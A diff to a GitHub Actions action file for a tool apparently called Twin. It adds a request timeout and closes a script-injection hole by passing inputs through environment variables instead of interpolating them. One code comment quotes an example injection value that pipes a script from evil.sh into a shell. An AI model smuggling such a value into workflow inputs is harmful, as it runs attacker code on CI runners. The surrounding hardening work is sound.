@@ -28,6 +28,9 @@ inputs:
   boot-timeout-ms:
     description: "Boot timeout per instance, in ms."
     required: false
+  request-timeout-ms:
+    description: "Timeout for a single scenario request, in ms. Bounds the whole run so a hung app can't stall the job."
+    required: false
   allow-remote:
     description: "Allow running even if the environment looks like it points at a non-local database/service."
     required: false
@@ -63,26 +66,46 @@ runs:
     - name: Run Twin
       id: run
       shell: bash
+      # Every input is passed through the environment and referenced as "$VAR",
+      # never interpolated into the script body with ${{ }}. Interpolation
+      # happens before bash ever sees the line, so an input containing
+      # `"; curl evil.sh | sh; #` would otherwise execute as part of this step.
+      env:
+        TWIN_CLI: ${{ github.action_path }}/dist/cli/index.js
+        TWIN_PROJECT_DIR: ${{ inputs.project-dir }}
+        TWIN_SCENARIO: ${{ inputs.scenario }}
+        TWIN_START: ${{ inputs.start }}
+        TWIN_BUILD: ${{ inputs.build }}
+        TWIN_HEALTH_PATH: ${{ inputs.health-path }}
+        TWIN_PORT_ENV: ${{ inputs.port-env }}
+        TWIN_BOOT_TIMEOUT_MS: ${{ inputs.boot-timeout-ms }}
+        TWIN_REQUEST_TIMEOUT_MS: ${{ inputs.request-timeout-ms }}
+        TWIN_ALLOW_REMOTE: ${{ inputs.allow-remote }}
+        TWIN_FAIL_ON_FINDING: ${{ inputs.fail-on-finding }}
       run: |
-        set +e
-        ARGS=(run --project "${{ inputs.project-dir }}")
-        [ -n "${{ inputs.scenario }}" ] && ARGS+=(--scenario "${{ inputs.scenario }}")
-        [ -n "${{ inputs.start }}" ] && ARGS+=(--start "${{ inputs.start }}")
-        [ -n "${{ inputs.build }}" ] && ARGS+=(--build "${{ inputs.build }}")
-        [ -n "${{ inputs.health-path }}" ] && ARGS+=(--health-path "${{ inputs.health-path }}")
-        [ -n "${{ inputs.port-env }}" ] && ARGS+=(--port-env "${{ inputs.port-env }}")
-        [ -n "${{ inputs.boot-timeout-ms }}" ] && ARGS+=(--boot-timeout-ms "${{ inputs.boot-timeout-ms }}")
-        [ "${{ inputs.allow-remote }}" = "true" ] && ARGS+=(--allow-remote)
+        set -uo pipefail
 
-        node "${{ github.action_path }}/dist/cli/index.js" "${ARGS[@]}"
-        code=$?
+        ARGS=(run --project "${TWIN_PROJECT_DIR:-.}")
+        [ -n "$TWIN_SCENARIO" ] && ARGS+=(--scenario "$TWIN_SCENARIO")
+        [ -n "$TWIN_START" ] && ARGS+=(--start "$TWIN_START")
+        [ -n "$TWIN_BUILD" ] && ARGS+=(--build "$TWIN_BUILD")
+        [ -n "$TWIN_HEALTH_PATH" ] && ARGS+=(--health-path "$TWIN_HEALTH_PATH")
+        [ -n "$TWIN_PORT_ENV" ] && ARGS+=(--port-env "$TWIN_PORT_ENV")
+        [ -n "$TWIN_BOOT_TIMEOUT_MS" ] && ARGS+=(--boot-timeout-ms "$TWIN_BOOT_TIMEOUT_MS")
+        [ -n "$TWIN_REQUEST_TIMEOUT_MS" ] && ARGS+=(--request-timeout-ms "$TWIN_REQUEST_TIMEOUT_MS")
+        [ "$TWIN_ALLOW_REMOTE" = "true" ] && ARGS+=(--allow-remote)
+
+        # Twin's exit code IS the result (0/1/2), so a non-zero exit must not
+        # abort the step before the outputs below are written.
+        code=0
+        node "$TWIN_CLI" "${ARGS[@]}" || code=$?
 
         echo "exit-code=$code" >> "$GITHUB_OUTPUT"
-        latest_file="${{ inputs.project-dir }}/.twin/latest"
+        latest_file="${TWIN_PROJECT_DIR:-.}/.twin/latest"
         if [ -f "$latest_file" ]; then
-          echo "report-dir=${{ inputs.project-dir }}/.twin/runs/$(cat "$latest_file")" >> "$GITHUB_OUTPUT"
+          echo "report-dir=${TWIN_PROJECT_DIR:-.}/.twin/runs/$(cat "$latest_file")" >> "$GITHUB_OUTPUT"
         fi
 
         if [ "$code" = "2" ]; then exit 2; fi
-        if [ "${{ inputs.fail-on-finding }}" = "true" ] && [ "$code" = "1" ]; then exit 1; fi
+        if [ "$TWIN_FAIL_ON_FINDING" = "true" ] && [ "$code" = "1" ]; then exit 1; fi
         exit 0
